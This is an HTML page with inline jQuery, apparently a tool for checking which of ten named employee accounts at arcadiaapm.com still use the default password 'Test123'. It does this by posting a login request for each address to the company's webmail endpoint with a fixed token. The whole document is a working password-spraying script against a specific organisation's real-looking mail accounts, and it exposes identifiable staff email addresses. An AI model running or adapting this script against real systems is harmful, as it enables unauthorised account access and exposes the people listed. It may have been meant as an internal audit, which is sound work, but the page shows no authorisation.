<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Arcadia Email Password Checking</title>    
    <link rel="stylesheet" href="css/style.css" />
    <script src="js/jquery-3.2.1.min.js" ></script>
</head>
<body>

    <div>
        <button id="addButton">Refresh</button>
    </div>
    <br />
    <table id="displayTable" border="1">
        <thead>
            <tr>
                <th>Email</th>
                <th>Use Default Password</th>
            </tr>
        </thead>
        <tbody>
        </tbody>
    </table>

    <script>

        (() => {
            
            var emails = [
                'aek.s@arcadiaapm.com',
                'chotmanee.t@arcadiaapm.com',
                'sagol.j@arcadiaapm.com',
                'rukpong.r@arcadiaapm.com',
                'nakarin.t@arcadiaapm.com',
                'apikom.j@arcadiaapm.com',
                'monchai.t@arcadiaapm.com',
                'songphon.c@arcadiaapm.com',
                'komnet.k@arcadiaapm.com',
                'songchai.s@arcadiaapm.com'
            ];

            function refreshDisplayTable() {

                $('#displayTable>tbody').html('');

                emails.forEach((email, index, array) => {
                    loginArcadiaMail(email, 'Test123');
                });
            }

            function loginArcadiaMail(username, password) {

                var data = {
                    'Action':'SystemLogin',
                    'Email':username,
                    'IncLogin':'',
                    'IncPassword':password,
                    'SignMe':'1',
                    'AccountID':'0',
                    'Token':'05af93004b98bc9ca678cd23598ed099'
                };
      
                $.post({
                    url: 'https://mail.arcadiaapm.com/webmailpro/?/Ajax/',
                    data: data,
                    dataType:'json',
                    crossDomain: true,
                    settings:{
                        headers: {
                            'Access-Control-Allow-Origin':'*',
                            'Access-Control-Allow-Credentials':true
                        }
                    },
                    success: function(data) {
                        var loginSuccess = data.Result != false;
                        if (loginSuccess) {
                            $('#displayTable>tbody').append('<tr><td>' + username + '</td><td class="yes">Yes</td></tr>');
                        } else {
                            $('#displayTable>tbody').append('<tr><td>' + username + '</td><td class="no">No</td></tr>');
                        }
                    },
                    error: function(a, b, c) {
                    }
                });

            }

            // Start coding here...
            $('#addButton').click(() => {
                refreshDisplayTable();
            });

            refreshDisplayTable();

        })();

    </script>
</body>
</html>